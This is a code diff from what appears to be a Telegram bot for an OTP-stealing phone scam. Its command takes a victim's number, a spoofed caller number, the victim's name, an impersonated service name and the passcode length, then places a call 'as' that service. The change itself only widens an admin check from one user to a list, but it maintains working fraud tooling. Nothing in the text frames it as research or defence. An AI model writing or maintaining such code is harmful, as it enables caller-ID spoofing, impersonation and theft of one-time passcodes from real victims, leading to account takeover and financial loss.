@@ -51,7 +51,7 @@ Usage: `{parts[0]} <victim_number> <spoof_number> <victim_name> <service_name> <
     )
     if (is_valid_phone_number(victim_number) and victim_number not in get_spoofing() and is_valid_phone_number(spoof_number) and check_spoof(spoof_number, service_name, victim_name)==True and is_name_valid(victim_name) and 4<= int(otp_digit) <=12):
         await message.answer(fr"✅ Calling \{victim_number} from \{spoof_number} as {service_name}",parse_mode='MarkdownV2')
-        if user_id == get_admin()['id']:
+        if user_id in get_admin()['id']:
             keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="End Call", callback_data="end_call")] ])
             await sleep(randint(0,2))    
             await message.answer("📞 *CALL RINGING*",reply_markup=keyboard,parse_mode='MarkdownV2')
@@ -101,7 +101,7 @@ Usage: `{parts[0]} <victim_number> <victim_name> <digit_length>`""",parse_mode="
     if (is_valid_phone_number(victim_number) and victim_number not in get_spoofing() and is_name_valid(victim_name) and 4<= int(otp_digit) <=12):
         
         await message.answer(fr"""✅ *Calling* \{victim_number} as {parts[0][1:]}""",parse_mode='MarkdownV2')
-        if user_id == get_admin()['id']:
+        if user_id in get_admin()['id']:
             keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="End Call", callback_data="end_call")] ])
             await sleep(randint(0,2))       
             await message.answer("📞 *CALL RINGING*",reply_markup=keyboard,parse_mode='MarkdownV2')
